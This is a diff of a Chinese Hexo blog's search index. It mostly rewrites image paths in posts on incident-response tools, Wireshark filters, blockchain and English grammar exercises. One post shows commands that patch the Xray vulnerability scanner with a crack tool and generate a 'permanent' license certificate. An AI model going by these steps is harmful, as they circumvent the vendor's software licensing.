@@ -153,9 +153,9 @@
     <url>/2022/04/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<p><strong>原创作者:</strong> <em>nul1</em></p>
 <p><strong>转自: <a href="https://www.cnblogs.com/nul1">https://www.cnblogs.com/nul1</a></strong></p>
-<h3 id="1-进程分析工具"><a href="#1-进程分析工具" class="headerlink" title="1 进程分析工具"></a>1 进程分析工具</h3><p>1.1 ProcessHacker<br>功能：ProcessHacker 是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的 dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间 Dump 到本地，此外还可以查看网络连接。<br>工具截图如下：<br><img src="E:\blog\source_posts\应急响应工具\1.png" alt="图片"></p>
-<p>注：查看具体进程的详细信息，双击 Processes 列表中的进程名字即可。<br>1.2 ProcessExplorer<br>功能：ProcessExplorer 是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的 dll、创建的线程、网络连接……，同样可以 Dump 出进程的内存空间到本地。<br><img src="E:\blog\source_posts\应急响应工具\2.png" alt="图片"></p>
-<p>1.3 ProcessMonitor<br>功能：ProcessMonitor 是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接…… 都与具体的进程关联起来。<br><img src="E:\blog\source_posts\应急响应工具\3.png" alt="图片"></p>
+<h3 id="1-进程分析工具"><a href="#1-进程分析工具" class="headerlink" title="1 进程分析工具"></a>1 进程分析工具</h3><p>1.1 ProcessHacker<br>功能：ProcessHacker 是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的 dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间 Dump 到本地，此外还可以查看网络连接。<br>工具截图如下：<br><img src="/.io//blog\source_posts\应急响应工具\1.png" alt="图片"></p>
+<p>注：查看具体进程的详细信息，双击 Processes 列表中的进程名字即可。<br>1.2 ProcessExplorer<br>功能：ProcessExplorer 是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的 dll、创建的线程、网络连接……，同样可以 Dump 出进程的内存空间到本地。<br><img src="/.io//blog\source_posts\应急响应工具\2.png" alt="图片"></p>
+<p>1.3 ProcessMonitor<br>功能：ProcessMonitor 是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接…… 都与具体的进程关联起来。<br><img src="/.io//blog\source_posts\应急响应工具\3.png" alt="图片"></p>
 <p>1.4 XueTr<br>功能：XueTr（官网 <a href="http://www.xuetr.com)是一个/">www.xuetr.com）是一个</a> Windows 系统信息查看软件，可协助排查木马、后门等病毒，功能包含：</p>
 <ol>
 <li>进程、线程、进程模块、进程窗口、进程内存、定时器、热键信息查看，杀进程、杀线程、卸载模块等功能</li>
@@ -169,26 +169,26 @@
 <li>文件系统查看，支持基本的文件操作</li>
 <li>查看（编辑）IE 插件、SPI、启动项、服务、Host 文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook 检测和恢复<br>14.DPC 定时器检测和删除<br>15.MBR Rootkit 检测和修复</li>
 <li>内核对象劫持检测</li>
-<li>其它一些手工杀毒时需要用到的功能，如修复 LSP、修复安全模式等<br><img src="E:\blog\source_posts\应急响应工具\4.png" alt="图片"></li>
+<li>其它一些手工杀毒时需要用到的功能，如修复 LSP、修复安全模式等<br><img src="/.io//blog\source_posts\应急响应工具\4.png" alt="图片"></li>
 </ol>
 <p>1.5 PCHunter<br>功能：XueTr 的增强版，功能和 XueTr 差不多，可参考上图。推荐更多使用 PCHunter，减少出故障的概率。</p>
-<p>1.6 ProcessDump<br>功能：可对指定的进程，将其进程空间内的所有模块单独 Dump 出来，甚至可 Dump 出隐藏的模块（即进程加载的 dll，这里通常是被注入）。<br><img src="E:\blog\source_posts\应急响应工具\5.png" alt="图片"></p>
+<p>1.6 ProcessDump<br>功能：可对指定的进程，将其进程空间内的所有模块单独 Dump 出来，甚至可 Dump 出隐藏的模块（即进程加载的 dll，这里通常是被注入）。<br><img src="/.io//blog\source_posts\应急响应工具\5.png" alt="图片"></p>
 <p>注：这是个命令行工具。</p>
-<p>1.7 PsTools<br>功能：PsTools 是命令行工具集，微软官方推荐，功能多而全，其涵盖的子功能（命令）如下：<br><img src="E:\blog\source_posts\应急响应工具\6.png" alt="图片"></p>
-<h3 id="2-流量分析工具"><a href="#2-流量分析工具" class="headerlink" title="2 流量分析工具"></a>2 流量分析工具</h3><p>2.1 Wireshark<br>功能：Wireshark 是一款常用的网络抓包工具，同时也可以用于流量分析。<br><img src="E:\blog\source_posts\应急响应工具\7.png" alt="图片"></p>
-<p>2.2 科来网络分析<br>功能：科来公司的一款流量分析工具，对比 Wireshark 要相对易用些（特别是流量分析入门人员），此外，该工具会自动将流量进行归类和统计。在某种意味上，还是比较方便的。<br><img src="E:\blog\source_posts\应急响应工具\8.png" alt="图片"></p>
-<p>2.3 TCPView<br>功能：查看系统的网络连接详情，每一条连接对应的进程、协议、进程、源目地址、源目端口、连接状态…… 总之，可展示当前活跃连接的所有详细信息。<br><img src="E:\blog\source_posts\应急响应工具\9.png" alt="图片"></p>
-<h3 id="3-启动项分析工具"><a href="#3-启动项分析工具" class="headerlink" title="3 启动项分析工具"></a>3 启动项分析工具</h3><p>3.1 AutoRuns<br>功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。<br><img src="E:\blog\source_posts\应急响应工具\10.png" alt="图片"></p>
+<p>1.7 PsTools<br>功能：PsTools 是命令行工具集，微软官方推荐，功能多而全，其涵盖的子功能（命令）如下：<br><img src="/.io//blog\source_posts\应急响应工具\6.png" alt="图片"></p>
+<h3 id="2-流量分析工具"><a href="#2-流量分析工具" class="headerlink" title="2 流量分析工具"></a>2 流量分析工具</h3><p>2.1 Wireshark<br>功能：Wireshark 是一款常用的网络抓包工具，同时也可以用于流量分析。<br><img src="/.io//blog\source_posts\应急响应工具\7.png" alt="图片"></p>
+<p>2.2 科来网络分析<br>功能：科来公司的一款流量分析工具，对比 Wireshark 要相对易用些（特别是流量分析入门人员），此外，该工具会自动将流量进行归类和统计。在某种意味上，还是比较方便的。<br><img src="/.io//blog\source_posts\应急响应工具\8.png" alt="图片"></p>
+<p>2.3 TCPView<br>功能：查看系统的网络连接详情，每一条连接对应的进程、协议、进程、源目地址、源目端口、连接状态…… 总之，可展示当前活跃连接的所有详细信息。<br><img src="/.io//blog\source_posts\应急响应工具\9.png" alt="图片"></p>
+<h3 id="3-启动项分析工具"><a href="#3-启动项分析工具" class="headerlink" title="3 启动项分析工具"></a>3 启动项分析工具</h3><p>3.1 AutoRuns<br>功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。<br><img src="/.io//blog\source_posts\应急响应工具\10.png" alt="图片"></p>
 <h3 id="4-信息收集工具"><a href="#4-信息收集工具" class="headerlink" title="4 信息收集工具"></a>4 信息收集工具</h3><p>4.1 FastIR<br>功能：收集操作系统的关键日志、关键信息，方便后续取证和排查分析。</p>
 <p>4.2 BrowsingHistoryView<br>功能：收集浏览器的历史记录，方便追溯域名、URL 的访问来源是否源自于用户行为。</p>
-<h3 id="5-辅助工具"><a href="#5-辅助工具" class="headerlink" title="5 辅助工具"></a>5 辅助工具</h3><p>5.1 Hash<br>功能：文件 hash 计算工具，可计算文件 MD5、SHA1、CRC 值，可用于辅助判断文件是否被篡改，或者使用哈希值到威胁情报网站查看是否为恶意文件。<br><img src="E:\blog\source_posts\应急响应工具\11.png" alt="图片"></p>
+<h3 id="5-辅助工具"><a href="#5-辅助工具" class="headerlink" title="5 辅助工具"></a>5 辅助工具</h3><p>5.1 Hash<br>功能：文件 hash 计算工具，可计算文件 MD5、SHA1、CRC 值，可用于辅助判断文件是否被篡改，或者使用哈希值到威胁情报网站查看是否为恶意文件。<br><img src="/.io//blog\source_posts\应急响应工具\11.png" alt="图片"></p>
 <p>5.2 ntfsdir<br>功能：病毒也有可能是以创建服务启动项的方式保持长久运行，点击 Autoruns 的 Services 功能，如下图，检查是否有异常的服务启动项。</p>
-<p>5.3 Unlocker<br>功能：可对难以删除的文件进行强制删除（包括锁定的文件），需安装，安装后右键菜单”Unlocker“即可弹出如下界面：<br><img src="E:\blog\source_posts\应急响应工具\12.png" alt="图片"></p>
-<h3 id="6-Webshell-查杀工具"><a href="#6-Webshell-查杀工具" class="headerlink" title="6 Webshell 查杀工具"></a>6 Webshell 查杀工具</h3><p>6.1 wscan<br>功能：深信服自研的一款 Webshell 查杀工具。<br><img src="E:\blog\source_posts\应急响应工具\13.png" alt="图片"></p>
-<p>6.2 D 盾<br>功能：D 盾是迪元素科技的一款 Webshell 查杀工具。<br><img src="E:\blog\source_posts\应急响应工具\14.png" alt="图片"></p>
-<h3 id="7-专杀工具"><a href="#7-专杀工具" class="headerlink" title="7 专杀工具"></a>7 专杀工具</h3><p>7.1 飞客蠕虫专杀<br>功能：专门针对飞客蠕虫病毒进行查杀的工具。<br>飞客蠕虫专杀工具有 kidokiller（卡巴斯基出品）、TMCleanTool（趋势科技出品）。<br>Kidokiller 运行截图如下，红色方框的所有 0 值表明没有中飞客蠕虫，如果有非 0 值，即说明中了飞客蠕虫。<br><img src="E:\blog\source_posts\应急响应工具\15.png" alt="图片"></p>
-<p>TMCleanTool 的运行截图如下，有威胁项即表明中了飞客蠕虫。<br><img src="E:\blog\source_posts\应急响应工具\16.png" alt="图片"></p>
-<p>7.2 Ramnit 专杀<br>功能：专门针对 Ramnit 类家族病毒进行查杀的工具。<br>FxRamnit 是赛门铁克出品的 Ramnit 专杀工具，其运行界面如下，点击”Start“按钮即可：<br><img src="E:\blog\source_posts\应急响应工具\17.png" alt="图片"></p>
+<p>5.3 Unlocker<br>功能：可对难以删除的文件进行强制删除（包括锁定的文件），需安装，安装后右键菜单”Unlocker“即可弹出如下界面：<br><img src="/.io//blog\source_posts\应急响应工具\12.png" alt="图片"></p>
+<h3 id="6-Webshell-查杀工具"><a href="#6-Webshell-查杀工具" class="headerlink" title="6 Webshell 查杀工具"></a>6 Webshell 查杀工具</h3><p>6.1 wscan<br>功能：深信服自研的一款 Webshell 查杀工具。<br><img src="/.io//blog\source_posts\应急响应工具\13.png" alt="图片"></p>
+<p>6.2 D 盾<br>功能：D 盾是迪元素科技的一款 Webshell 查杀工具。<br><img src="/.io//blog\source_posts\应急响应工具\14.png" alt="图片"></p>
+<h3 id="7-专杀工具"><a href="#7-专杀工具" class="headerlink" title="7 专杀工具"></a>7 专杀工具</h3><p>7.1 飞客蠕虫专杀<br>功能：专门针对飞客蠕虫病毒进行查杀的工具。<br>飞客蠕虫专杀工具有 kidokiller（卡巴斯基出品）、TMCleanTool（趋势科技出品）。<br>Kidokiller 运行截图如下，红色方框的所有 0 值表明没有中飞客蠕虫，如果有非 0 值，即说明中了飞客蠕虫。<br><img src="/.io//blog\source_posts\应急响应工具\15.png" alt="图片"></p>
+<p>TMCleanTool 的运行截图如下，有威胁项即表明中了飞客蠕虫。<br><img src="/.io//blog\source_posts\应急响应工具\16.png" alt="图片"></p>
+<p>7.2 Ramnit 专杀<br>功能：专门针对 Ramnit 类家族病毒进行查杀的工具。<br>FxRamnit 是赛门铁克出品的 Ramnit 专杀工具，其运行界面如下，点击”Start“按钮即可：<br><img src="/.io//blog\source_posts\应急响应工具\17.png" alt="图片"></p>
 <p>注：由于 Ramnit 是全盘感染性病毒，故此专杀工具运行时间比较长，需耐心等待（FxRamnit 常常给人一种” 假死 “的感觉）。</p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
@@ -326,7 +326,7 @@
 <p>每年真正比较有影响力的漏洞编号，其实并不多。作为一个安全工程师，首先我们要保持一定的风险敏感度，一定要重视起来。当你足够重视的时候，你才能慢慢引导你身边的人，你所在的团队跟着你一起重视。原本以为很难的事情,做了之后才知道原来很简单。</p>
 <p>–来自某次应急漏洞处置后的心得体会。</p>
 <p><strong>思维导图如下所示：</strong></p>
-<p><img src="E:\blog\source_posts\安全应急漏洞排查思路\01.png" alt="img"></p>
+<p><img src="/.io//blog\source_posts\安全应急漏洞排查思路\01.png" alt="img"></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>应急响应</category>
@@ -360,7 +360,7 @@
 <p>该系统帮助工厂管理层更好地确定可以改善工人体验的方面，而这些干预措施和管理层的后续行动有可能减少人员流动和缺勤，同时改善可持续和生产性的做法。</p>
 <p>在冠状病毒大流行的时代，企业或是工厂需要更加关注员工的健康和福祉。因此该平台对于企业、工厂来说是一个非常有效且有用的手段。当然，发布者在白皮书上也说明了此平台仍然有许多困难需要去克服。</p>
 <p>但此平台的优势在于帮助企业在全球大流行病的时代下，提供了一个保障、保护工人的福利以及生活的手段。员工对于厂商来说是重要的组成部分，员工染病了或是福利得不到保障而罢工的话，对于企业的供应链、运转来说都是致命的。而上述平台则是帮助企业确保运营健康的一个工具。</p>
-<p><img src="E:\blog\source_posts\区块链与制造业的结合\01.png" alt="图片"></p>
+<p><img src="/.io//blog\source_posts\区块链与制造业的结合\01.png" alt="图片"></p>
 <p><em>Shining a Light on Worker Well-being平台白皮书</em></p>
 <h2 id="区块链与供应链的结合"><a href="#区块链与供应链的结合" class="headerlink" title="区块链与供应链的结合"></a>区块链与供应链的结合</h2><p>有些公司也搭建了区块链系统来提高与客户之间的信任度和信息交换。例如知名电动车公司特斯拉就在上海超级工厂应用了区块链技术来优化物流和溯源系统，为用户提供包括载货门、预约日期、终端放行等在内的一系列信息服务。国内另一知名酒公司茅台利用区块链技术进行产品溯源的同时，还对流转和物流系统进行了完善，做到了商品从生产流程到出库再到配送，全流程信息透明且可以查询。</p>
 <p>2020年12月，国家电网开展了“区块链﹢智慧能源”的计划，利用区块链技术，通过将新能源发电计划数据、用电计划数据、实际用电数据等重要数据上链存证，进行校验确保新能源出力曲线交易业务数据的真实、可信，保障新能源消纳交易的真实发生。</p>
@@ -953,8 +953,8 @@
 <p>从陈老师那里，我也明白了对一件事情需要认真到什么程度。考研加油！</p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
-        <category>自我探索</category>
         <category>英语</category>
+        <category>自我探索</category>
         <category>陈仲凯老师</category>
       </categories>
       <tags>
@@ -975,7 +975,7 @@
     <url>/2021/08/02/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%BA%90%E6%95%85%E4%BA%8B%E9%9B%86%E9%94%A6/</url>
     <content><![CDATA[<object data="https://ckcah.github.io/books/英语词源故事集锦.pdf" type="application/pdf" width="100%" height="980px">
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+</object><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>扩展读物</category>
       </categories>
@@ -1222,7 +1222,7 @@
 
 <h4 id="检验是否成功，可查看output文件是否生成对应的文档"><a href="#检验是否成功，可查看output文件是否生成对应的文档" class="headerlink" title="检验是否成功，可查看output文件是否生成对应的文档"></a>检验是否成功，可查看output文件是否生成对应的文档</h4><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120230355752.png">
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+</src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>hadoop</category>
       </categories>
@@ -1468,13 +1468,13 @@
 
 
 <h1 id="0x04-破解过程"><a href="#0x04-破解过程" class="headerlink" title="0x04 破解过程"></a>0x04 破解过程</h1><h2 id="创建文件夹方便查找文件"><a href="#创建文件夹方便查找文件" class="headerlink" title="创建文件夹方便查找文件"></a>创建文件夹方便查找文件</h2><p>初始状态下应该是只有这三个文件，<code>config.yaml</code>是点击<code>xray_windows_386.exe</code>后生成的</p>
-<p><img src="C:\Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005021846719.png"></p>
+<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005021846719.png"></p>
 <h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><h3 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h3><p>使用 <code>-g username</code> 生成永久证书</p>
 <h3 id="Patch-Xray"><a href="#Patch-Xray" class="headerlink" title="Patch Xray"></a>Patch Xray</h3><p>使用 <code>-c xray_path</code> 修改xray</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;xray-crack.exe -c xray_windows_386.exe</span><br><span class="line">&gt;xray-crack.exe -g ckcahgithubio</span><br></pre></td></tr></table></figure>
 
 <p>完成</p>
-<p><img src="C:\Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005022249364.png" alt="image-20201005022249364"></p>
+<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005022249364.png" alt="image-20201005022249364"></p>
 <h1 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>web安全</category>
@@ -1494,7 +1494,7 @@
 
 <p>接下来打开Wireshark，可以看到设别的网卡信息，选择需要抓包的网卡双击即可。</p>
 <p>或者按Ctrl+K，勾选需要抓包的网卡，一般情况都会选择WLAN点击Start开始抓包。从流量波形图可以看到弯曲起伏则表示有流量，直线则没有流量。</p>
-<p><img src="C:\Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190225228.png" alt="image-20201002190225228"></p>
+<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190225228.png" alt="image-20201002190225228"></p>
 <h3 id="0x02-Wireshark语法"><a href="#0x02-Wireshark语法" class="headerlink" title="0x02 Wireshark语法"></a>0x02 Wireshark语法</h3><p>1.过滤MAC地址</p>
 <p>eth.addr == 00:71:cc:9a:28:93//过滤目标或源地址是00:71:cc:9a:28:93的数据包</p>
 <p>eth.src == 00:71:cc:9a:28:93//过滤源地址是00:71:cc:9a:28:93的数据包</p>
@@ -1562,7 +1562,7 @@
 <p>第3行：网络层详细信息，主要的是双方的IP地址</p>
 <p>第4行：传输层的详细信息，主要的是双方的端口号</p>
 <p>第5行：TCP或UDP是传输的DATA，DNS这是域名的相关信息</p>
-<p><img src="C:\Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190520816.png" alt="image-20201002190520816"></p>
+<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190520816.png" alt="image-20201002190520816"></p>
 <p>2.wireshark着色规则</p>
 <p>在菜单栏中点开视图中的着色规则就可以看到</p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
@@ -1578,31 +1578,31 @@
     <url>/2020/09/11/%E5%8A%A8%E5%90%8D%E8%AF%8D%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h2><p><strong>请练习以下句子，试试看该用(A)不定词to V，还是(B)动名词 Ving。如果两者都可以，答案就是(C)。</strong></p>
 <p>1.The barber’s apprentice practiced <strong>to shaving</strong> (shave) on a watermelon.</p>
-<p><font color='red'>shaving</font></p>
+<p><font color="red">shaving</font></p>
 <p>2.I love <strong>to watch</strong> (watch) horror movies alone.</p>
-<p><font color='red'>to watch 和 watching都可以若用watching，表示“看电影”这件持续进行的事情。若用to watch，则带有一丝想要“去看”的味道。</font></p>
+<p><font color="red">to watch 和 watching都可以若用watching，表示“看电影”这件持续进行的事情。若用to watch，则带有一丝想要“去看”的味道。</font></p>
 <p>3.<strong>Listening</strong> (Listen) to music can be very relaxing.</p>
-<p><font color='red'>“听音乐”和dancing、mountain-climbing等要持续的活动一样，多用动名词表示。</font></p>
+<p><font color="red">“听音乐”和dancing、mountain-climbing等要持续的活动一样，多用动名词表示。</font></p>
 <p>4.You must not forget <strong>paying</strong> (pay) the phone bill.</p>
-<p><font color='red'>to pay</font></p>
-<p><font color='red'>动词must not forget暗示电话费“尚未付，应该去付”，故用表示不确定的to pay</font></p>
+<p><font color="red">to pay</font></p>
+<p><font color="red">动词must not forget暗示电话费“尚未付，应该去付”，故用表示不确定的to pay</font></p>
 <p>5.The workers finished <strong>to paint</strong> (paint) and left.</p>
-<p><font color='red'>painting</font></p>
-<p><font color='red'>动词finish表示油漆的工作已经结束，不适合用不确定意味的不定词，故用<br>painting。</font></p>
+<p><font color="red">painting</font></p>
+<p><font color="red">动词finish表示油漆的工作已经结束，不适合用不确定意味的不定词，故用<br>painting。</font></p>
 <p>6.Seeing is <strong>believing</strong> (believe).</p>
 <p>7.To see is <strong>to believe</strong> (believe).</p>
 <p>8.Thank you for <strong>calling</strong> (call).</p>
-<p><font color='red'>在介词后面不能用不定词，只能用calling</font></p>
+<p><font color="red">在介词后面不能用不定词，只能用calling</font></p>
 <p>9.John’s__to leave__ (leave) the party so early was rather impolite.</p>
-<p><font color='red'>leaving</font></p>
-<p><font color='red'>在所有格后面也不能用不定词，只能用leaving</font></p>
+<p><font color="red">leaving</font></p>
+<p><font color="red">在所有格后面也不能用不定词，只能用leaving</font></p>
 <p>10.I really enjoyed <strong>being</strong> (be) at your party.</p>
-<p><font color='red'>动词enjoy表示“乐在其中”，如果用不定词to be，意味著“不确定”，也<br>就是“还乐不起来”，所以只能用being，表示“已经在进行中”，因而有乐趣出来。</font></p>
+<p><font color="red">动词enjoy表示“乐在其中”，如果用不定词to be，意味著“不确定”，也<br>就是“还乐不起来”，所以只能用being，表示“已经在进行中”，因而有乐趣出来。</font></p>
 <h2 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h2><p>请选出最适当的答案填入空格内，以使句子完整。</p>
 <p>1.I just took __ and don’t feel like swimming now.</p>
 <p>D</p>
 <p><font color="red">C</font></p>
-<p><font color='red'>take a swim是“游一趟”，swimming则是“游泳运动”。</font></p>
+<p><font color="red">take a swim是“游一趟”，swimming则是“游泳运动”。</font></p>
 <blockquote>
 <p>(A) swimming</p>
 <p>(B) to swim</p>
@@ -1611,7 +1611,7 @@
 </blockquote>
 <p>2.I resent __ a hypocrite(<font color="red">伪君子</font>), especially when I’m telling the truth.</p>
 <p>D</p>
-<p><font color='red'>下文“特别是我明明说了实话”，因而前面应该是被动的，“我讨厌被叫作<br>伪君子”。只有D是被动态</font></p>
+<p><font color="red">下文“特别是我明明说了实话”，因而前面应该是被动的，“我讨厌被叫作<br>伪君子”。只有D是被动态</font></p>
 <blockquote>
 <p>(A) calling</p>
 <p>(B) called</p>
@@ -1620,8 +1620,8 @@
 </blockquote>
 <p>3.__ outside my window every night is getting on my nerves.</p>
 <p>A</p>
-<p><font color='red'>D</font></p>
-<p><font color='red'>本句的动词is是单数，而A、B、C都以cats为主语，是复数，只有D用<br>screaming(尖叫)作主语，是单数</font></p>
+<p><font color="red">D</font></p>
+<p><font color="red">本句的动词is是单数，而A、B、C都以cats为主语，是复数，只有D用<br>screaming(尖叫)作主语，是单数</font></p>
 <blockquote>
 <p>(A) The cats screaming</p>
 <p>(B) The cats to scream</p>
@@ -1630,7 +1630,7 @@
 </blockquote>
 <p>4.Learning a language is __ all about the culture.</p>
 <p>B</p>
-<p><font color='red'>空格在be动词后面，是主语补语的位置，要求和主语对称，而主语是动名词，<br>因此也选动名词</font></p>
+<p><font color="red">空格在be动词后面，是主语补语的位置，要求和主语对称，而主语是动名词，<br>因此也选动名词</font></p>
 <blockquote>
 <p>(A) to learn</p>
 <p>(B) learning</p>
@@ -1639,7 +1639,7 @@
 </blockquote>
 <p>5.__ is a very exacting sport.</p>
 <p>A</p>
-<p><font color='red'>mountain置于形容词位置，不能有复数</font></p>
+<p><font color="red">mountain置于形容词位置，不能有复数</font></p>
 <blockquote>
 <p>(A) Mountain-climbing</p>
 <p>(B) Climb mountains</p>
@@ -1648,7 +1648,7 @@
 </blockquote>
 <p>6.In doing magic,the trick lies in __ your audience.</p>
 <p>D</p>
-<p><font color='red'>介词后面应用名词，空格后面又有名词 your audience，<br>故只能选diverting,让your audience作它的宾语</font></p>
+<p><font color="red">介词后面应用名词，空格后面又有名词 your audience，<br>故只能选diverting,让your audience作它的宾语</font></p>
 <blockquote>
 <p>(A) divert</p>
 <p>(B) diversion</p>
@@ -1657,7 +1657,7 @@
 </blockquote>
 <p>7.The workers objected to __ like slaves.</p>
 <p>D</p>
-<p><font color='red'>object to的这个to解释为“对”某事表示反对，所以是介词，后应接名词，<br>故由B或D来选。再从意思上看应是被动，“被当奴隶看待”，故选D</font></p>
+<p><font color="red">object to的这个to解释为“对”某事表示反对，所以是介词，后应接名词，<br>故由B或D来选。再从意思上看应是被动，“被当奴隶看待”，故选D</font></p>
 <blockquote>
 <p>(A) be treated</p>
 <p>(B) treating</p>
@@ -1666,7 +1666,7 @@
 </blockquote>
 <p>8.Everyone marveled at __ the French Open.</p>
 <p>A</p>
-<p><font color='red'>让人啧啧称奇的应是“事”，C和D则是指人，故可排除。而“张德培赢得<br>法国公开赛”中的win是动词（因为后面有the French Open作宾语)，所以<br>在所有格Chang’s之后要改成动名词winning，词类才正确</font></p>
+<p><font color="red">让人啧啧称奇的应是“事”，C和D则是指人，故可排除。而“张德培赢得<br>法国公开赛”中的win是动词（因为后面有the French Open作宾语)，所以<br>在所有格Chang’s之后要改成动名词winning，词类才正确</font></p>
 <blockquote>
 <p>(A) Michael Chang’s winning</p>
 <p>(B) Michael Chang’s win</p>
@@ -1675,8 +1675,8 @@
 </blockquote>
